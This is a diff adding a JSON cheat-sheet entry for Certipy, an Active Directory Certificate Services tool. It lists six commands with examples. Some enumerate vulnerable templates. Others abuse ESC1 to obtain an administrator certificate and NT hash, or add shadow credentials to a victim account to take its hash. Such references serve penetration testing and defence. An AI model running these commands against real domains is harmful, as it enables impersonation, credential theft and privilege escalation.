@@ -1,0 +1,66 @@
+{
+  "tool": "certipy",
+  "name": "Certipy",
+  "description": "A tool for enumerating and abusing Active Directory Certificate Services (AD CS) — vulnerable templates, certificate theft and shadow credentials.",
+  "tags": [
+    "Active Directory",
+    "AD CS",
+    "certificates",
+    "privilege escalation"
+  ],
+  "homepage": "https://github.com/ly4k/Certipy",
+  "docs": "https://github.com/ly4k/Certipy",
+  "install": {
+    "pipx": "pipx install certipy-ad"
+  },
+  "related": [
+    "impacket",
+    "bloodhound-python",
+    "crackmapexec"
+  ],
+  "total_commands": 6,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Enumeration",
+      "command": "certipy find -u <user>@<domain> -p <pass> -dc-ip <ip>",
+      "example": "certipy find -u svc@corp.local -p pass -dc-ip 10.10.10.1",
+      "explanation": "Enumerates AD Certificate Services and flags vulnerable templates (ESC1–ESC16)."
+    },
+    {
+      "id": 2,
+      "category": "Enumeration",
+      "command": "certipy find -u <user>@<domain> -p <pass> -dc-ip <ip> -vulnerable -stdout",
+      "example": "certipy find -u svc@corp.local -p pass -dc-ip 10.10.10.1 -vulnerable -stdout",
+      "explanation": "Prints only the vulnerable templates to the terminal."
+    },
+    {
+      "id": 3,
+      "category": "Abuse (ESC1)",
+      "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca> -target <host> -template <tmpl> -upn <victim>",
+      "example": "certipy req -u svc@corp.local -p pass -ca CORP-CA -target ca.corp.local -template VulnTemplate -upn administrator@corp.local",
+      "explanation": "Requests a certificate as another user through a misconfigured template."
+    },
+    {
+      "id": 4,
+      "category": "Abuse (ESC1)",
+      "command": "certipy auth -pfx <file>.pfx -dc-ip <ip>",
+      "example": "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1",
+      "explanation": "Authenticates with the issued certificate and returns a TGT and the NT hash."
+    },
+    {
+      "id": 5,
+      "category": "Shadow credentials & more",
+      "command": "certipy shadow auto -u <user>@<domain> -p <pass> -account <target>",
+      "example": "certipy shadow auto -u svc@corp.local -p pass -account victim",
+      "explanation": "Adds a Key Credential to a target account and retrieves its NT hash (needs write rights)."
+    },
+    {
+      "id": 6,
+      "category": "Shadow credentials & more",
+      "command": "certipy ca -u <user>@<domain> -p <pass> -ca <ca> -list-templates",
+      "example": "certipy ca -u svc@corp.local -p pass -ca CORP-CA -list-templates",
+      "explanation": "Inspects the certificate authority and its templates."
+    }
+  ]
+}
